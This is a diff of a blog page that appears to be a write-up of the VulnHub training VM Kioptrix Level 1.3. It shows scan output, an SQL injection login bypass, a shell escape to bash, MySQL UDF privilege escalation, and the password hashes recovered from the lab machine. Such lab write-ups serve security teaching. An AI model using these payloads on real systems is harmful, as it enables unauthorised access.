@@ -1,46 +1,48 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8"/>
-    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
-    <meta name="description" content="Personal Weblog"/>
-    <meta content="width=device-width, initial-scale=1" name="viewport"/>
-    <title>मंथन | Manthan</title>
-    <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp"/>
-    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.css"/>
-    <link id="codestylesheet" rel="stylesheet" type="text/css" media="screen" href="/static/css/atelier-forest-light.css">
-    <script charset="UTF-8" src="/static/js/highlight.min.js"></script>
-    <script charset="UTF-8" src="/static/js/highlightjs-line-numbers.min.js"></script>
-    <script charset="UTF-8" src="/static/js/go.min.js"></script>
-   </head>
-  <body>
-    <div class="body">
-      <div class="menu">
-        <table>
-          <tr>
-            <td colspan="3"><a class="menu_home" href="/index.html">मंथन</a></td>
-          </tr>
-          <tr>
-            <td><a class="menu_archive" href="/archive.html">💾 Archive</a></td>
-            <td><a class="menu_tags" href="/tags.html">🔖 Tags</a></td>
-            <td><a class="menu_stats" href="/stats.html">📊 Stats</a></td>
-            <!--<td>-->
-            <!--  <label class="theme-switch" for="checkbox">-->
-            <!--    <input type="checkbox" id="checkbox" />-->
-            <!--    <div class="slider round"></div>-->
-            <!--  </label>-->
-            <!--</td>-->
-          </tr>
-        </table>
+<html lang="en" data-theme-mode="light">
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="Ankur Tyagi (@7h3rAm)">
+  <meta name="description" content="Personal Weblog">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Manthan</title>
+  <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp">
+  <link rel="stylesheet" href="/static/css/base.css">
+  <link rel="stylesheet" href="/static/css/atelier-forest-light.css">
+  <script src="/static/js/theme.js"></script>
+  <script src="/static/js/highlight.min.js"></script>
+  <script src="/static/js/hljs-bash.min.js"></script>
+  <script src="/static/js/hljs-python.min.js"></script>
+  <script src="/static/js/hljs-sql.min.js"></script>
+  <script src="/static/js/hljs-powershell.min.js"></script>
+  <script src="/static/js/hljs-line-numbers.min.js"></script>
+</head>
+<body>
+
+<header>
+  <div>
+    <h1 class="site-title"><a href="/" style="color:inherit;text-decoration:none;">manthan</a></h1>
+    <p class="meta">security research | code | writeups</p>
+  </div>
+</header>
+
+<article id="top">
+  <div class="post-header">
+    <div style="display:flex; justify-content:space-between; align-items:flex-start;">
+      <div>
+        <h1 class="post-title" style="margin:0; cursor:pointer;" onclick="toggleAllSections()">[VulnHub] Kioptrix: Level 1.3 (#4)</h1>
       </div>
-      <div class="content">
-          <h1 class="h1 title collapsible" onclick="toggle(this);">[VulnHub] Kioptrix: Level 1.3 (#4)</h1>
-    <div class="title"><code><span class="sparklines"><span style="color:#6c757d;">▇</span><span style="color:#20c997;">▁</span><span style="color:#69359c;">▂</span><span style="color:#99cc99;">▁</span><span style="color:#6610f2;">▅</span><span style="color:#17a2b8;">▆</span><span style="color:#20b2aa;">▃</span><span style="color:#5b92e5;">█</span><span style="color:#99cc99;">▃</span><span style="color:#6c757d;">▆</span><span style="color:#6f42c1;">▇</span><span style="color:#e83e8c;">█</span><span style="color:#2196f3;">█</span><span style="color:#fe4164;">▃</span><span style="color:#5b92e5;">▄</span><span style="color:#dc3545;">▃</span><span style="color:#20b2aa;">▇</span><span style="color:#6c757d;">▅</span><span style="color:#00bcd4;">▅</span><span style="color:#fd7e14;">▇</span><span style="color:#20b2aa;">▃</span><span style="color:#fd7e14;">▆</span><span style="color:#6c757d;">█</span><span style="color:#fe4164;">▅</span><span style="color:#99cc99;">▇</span><span style="color:#6610f2;">▃</span><span style="color:#17a2b8;">█</span><span style="color:#8357ff;">▂</span><span style="color:#20c997;">▅</span><span style="color:#4caf50;">▁</span><span style="color:#6c757d;">▁</span><span style="color:#ffc107;">▃</span><span style="color:#6f42c1;">▃</span><span style="color:#007bff;">▂</span><span style="color:#ffcc66;">▅</span><span style="color:#ffc107;">▂</span><span style="color:#6c757d;">▇</span><span style="color:#99cc99;">▇</span><span style="color:#6610f2;">█</span><span style="color:#f44336;">▅</span><span style="color:#6610f2;">▃</span><span style="color:#6610f2;">▇</span><span style="color:#5b92e5;">▃</span><span style="color:#ffc107;">▄</span><span style="color:#dc3545;">▅</span><span style="color:#00b7eb;">▆</span><span style="color:#5b92e5;">▁</span><span style="color:#a50b5e;">▃</span><span style="color:#fe4164;">▃</span><span style="color:#20b2aa;">▅</span><span style="color:#6f42c1;">█</span><span style="color:#a50b5e;">▂</span><span style="color:#20c997;">▃</span><span style="color:#99cc99;">▃</span><span style="color:#6610f2;">█</span><span style="color:#20b2aa;">█</span><span style="color:#0c9;">▃</span><span style="color:#fe4164;">▅</span><span style="color:#5b92e5;">▁</span><span style="color:#ffcc66;">▁</span><span style="color:#a50b5e;">▄</span><span style="color:#6c757d;">▁</span><span style="color:#2196f3;">█</span><span style="color:#e83e8c;">▇</span></span></code></div>
-    <hr>
-          <p style="float:left;"><a href="/posts/20190929_vulnhub-kioptrix3.html"> « </a>📅 published on <code>08/Oct/2019</code><a href="/posts/20191009_vulnhub-kioptrix5.html"> » </a></p>
-        <p style="float:right;">🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
-    <div style="clear:both;"></div>
-    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+      <div class="meta" style="text-align:right;">
+        <div>08/Oct/2019</div>
+        <div class="tags"><a href="/tags.html#vulnhub">vulnhub</a>, <a href="/tags.html#writeup">writeup</a></div>
+      </div>
+    </div>
+    <nav class="post-nav" style="margin-top:0.3em;">
+      <a class="nav-prev" href="/posts/20190929_vulnhub-kioptrix3.html"><span class="arrow">&lt;&lt;&lt;</span> <span class="nav-title">[VulnHub] Kioptrix: Level 1.2 (#3)</span></a>      <a class="nav-next" href="/posts/20191009_vulnhub-kioptrix5.html"><span class="nav-title">[VulnHub] Kioptrix: 2014 (#5)</span> <span class="arrow">&gt;&gt;&gt;</span></a>    </nav>
+  </div>
+
+  <div class="content">
+    <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested active">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/">Kioptrix: Level 1.3 (#4)</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested active"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_kioptrix4/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -48,7 +50,7 @@
 <p class="nested active"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_kioptrix4/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested active">1. <code>80/tcp/http/Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_sqli">exploit_sqli</a>, <a href="https://github.com/7h3rAm/writeups#exploit_credsreuse">exploit_credsreuse</a>, <a href="https://github.com/7h3rAm/writeups#privesc_shell_escape">privesc_shell_escape</a>, <a href="https://github.com/7h3rAm/writeups#privesc_mysql_root">privesc_mysql_root</a>, <a href="https://github.com/7h3rAm/writeups#privesc_mysql_udf">privesc_mysql_udf</a>  </p>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested active">1. Here's the Nmap scan result:  </p>
 <pre class="nested active"><code># Nmap 7.70 scan initiated Tue Oct  8 15:47:02 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix4/results/192.168.92.131/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix4/results/192.168.92.131/scans/xml/_quick_tcp_nmap.xml 192.168.92.131
 Nmap scan report for 192.168.92.131
@@ -135,7 +137,7 @@ index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret Name: loneferret,,, De
 <h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
 <pre class="nested active"><code>ssh: root, robert, john, loneferret
 </code></pre>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested active">1. We find a login page at <code>http://192.168.92.131:80/index.php</code> and successfully bypass it via a sqli. Once logged in, the webapp shows the unhashed/cleartext password for user <code>john</code>. We repeat the process to obtain password for user <code>robert</code> as well (<code>loneferret</code> is not registered on this web application):  </p>
 <pre class="nested active"><code>name: john
 password: ' or 1=1 -- -
@@ -154,7 +156,7 @@ password: ' or 1=1 -- -
 <pre class="nested active"><code>echo os.system('/bin/bash')
 </code></pre>
 <p class="nested active"><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot05.png.webp" />  </p>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested active"><code>john@Kioptrix4&gt; id
 uid=1001(john) gid=1001(john) groups=1001(john)
 john@Kioptrix4&gt;  
@@ -177,7 +179,7 @@ loneferret
 john
 robert
 </code></pre>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested active">1. We explore the web directory and find <code>mysql</code> credentials for user <code>root</code>:  </p>
 <p class="nested active"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot06.png.webp" />  </p>
 <p class="nested active">2. We explore running processes and find that <code>mysql</code> is executing with elevated privileges (pid: 4638). We search for the required <code>mysql</code> shared object file and find it at <code>/usr/lib/lib_mysqludf_sys.so</code>. This means we can run custom commands from within <code>mysql</code> shell as user <code>root</code>:  </p>
@@ -194,7 +196,7 @@ cat /root/congrats.txt
 </code></pre>
 <p class="nested active"><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot09.png.webp" />  </p>
 <p class="nested active"><img alt="writeup.privesc.steps.4.2" src="/static/files/posts_vulnhub_kioptrix4/screenshot10.png.webp" />  </p>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
 <pre class="nested active"><code>root:$1$5GMEyqwV$x0b1nMsYFXvczN0yI0kBB.:15375:............
 loneferret:$1$/x6RLO82$43aCgYCrK7p2KFwgYw9iU1:15375.............
@@ -205,7 +207,7 @@ robert:$1$rQRWeUha$ftBrgVvcHYfFFFk6Ut6cM1:15374:............
 <pre class="nested active"><code>liggoat: john/MyNameIs...., robert/ADGAdsafdfwt4ga......
 ssh: john/MyNameIs...., robert/ADGAdsafdfwt4ga......
 </code></pre>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested active">
 <li><a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/">https://www.vulnhub.com/entry/kioptrix-level-13-4,25/</a>  </li>
 <li><a href="https://www.abatchy.com/2016/12/kioptrix-level-13-4-walkthrough-vulnhub.html">https://www.abatchy.com/2016/12/kioptrix-level-13-4-walkthrough-vulnhub.html</a>  </li>
@@ -213,35 +215,56 @@ ssh: john/MyNameIs...., robert/ADGAdsafdfwt4ga......
 <li><a href="https://web.archive.org/web/20190822075547/https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/">https://web.archive.org/web/20190822075547/https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/</a>  </li>
 <li><a href="https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html">https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html</a>  </li>
 </ul>
+  </div>
+
+  <nav class="post-nav" style="margin-top:1em;">
+    <a class="nav-prev" href="/posts/20190929_vulnhub-kioptrix3.html"><span class="arrow">&lt;&lt;&lt;</span> <span class="nav-title">[VulnHub] Kioptrix: Level 1.2 (#3)</span></a>    <a class="nav-next" href="/posts/20191009_vulnhub-kioptrix5.html"><span class="nav-title">[VulnHub] Kioptrix: 2014 (#5)</span> <span class="arrow">&gt;&gt;&gt;</span></a>  </nav>
+</article>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  var content = document.querySelector('.content');
+  if (content) {
+    var headings = content.querySelectorAll('h2,h3,h4,h5,h6');
+    headings.forEach(function(h) {
+      var link = document.createElement('a');
+      link.href = '#top';
+      link.className = 'top-link';
+      link.textContent = ' [^]';
+      link.style.fontSize = '0.8em';
+      link.style.color = 'var(--muted)';
+      h.appendChild(link);
+    });
+  }
+});
+</script>
+
+<footer>
+  <p class="nested active">cc-by-sa-4.0</p>
+</footer>
+
+<aside class="sidebar">
+  <div class="sidebar-content">
+    <h4 class="h4 collapsible" onclick="toggle(this);">navigation</h4>
+    <a href="/">home</a>
+    <a href="/archive.html">archive</a>
+    <a href="/tags.html">tags</a>
+    <a href="/stats.html">stats</a>
     <hr>
-          <p style="float:left;">« <a href="/posts/20190929_vulnhub-kioptrix3.html">[VulnHub] Kioptrix: Level 1.2 ...</a> «</p>
-      <p style="float:right;">» <a href="/posts/20191009_vulnhub-kioptrix5.html">[VulnHub] Kioptrix: 2014 (#5)</a> »</p>
-          </div>
-      <div><a class="footer" href="https://github.com/7h3rAm/7h3rAm.github.io">  </a></div>
-      <script>hljs.initHighlightingOnLoad();</script>
-      <script>hljs.initLineNumbersOnLoad();</script>
-      <script>
-        function toggle(s){
-          s.classList.toggle("expanded");
-          var t=!1,i=!1,a=!1;
-          s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0);
-          for(var l=s.nextElementSibling;l;){
-            if(t&&l.classList.contains("h2")){
-              l.classList.toggle("active");
-              break
-            }
-            if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){
-              l.classList.toggle("active");
-              break
-            }
-            if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){
-              l.classList.toggle("active");
-              break
-            }
-            l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
-          }
-        }
-      </script>
+    <a href="https://github.com/@7h3rAm">github</a>
+    <a href="https://twitter.com/@7h3rAm">twitter</a>
+    <hr>
+    <h4 class="h4 collapsible" onclick="toggle(this);">toggles</h4>
+    <div class="toggle-group">
+      <button class="toggle-btn toggle-theme" onclick="toggleThemeMode()">◑ theme</button>
+      <button class="toggle-btn toggle-density" onclick="toggleDensity()">▥ density</button>
+      <button class="toggle-btn toggle-width" onclick="toggleWidth()">▱ width</button>
+      <button class="toggle-btn toggle-justify" onclick="toggleJustify()">¶ justify</button>
+      <button class="toggle-btn toggle-collapse" onclick="toggleAllSections()">±</button>
     </div>
-  </body>
+  </div>
+</aside>
+
+<script>hljs.configure({ignoreUnescapedHTML: true}); hljs.highlightAll(); hljs.initLineNumbersOnLoad();</script>
+</body>
 </html>
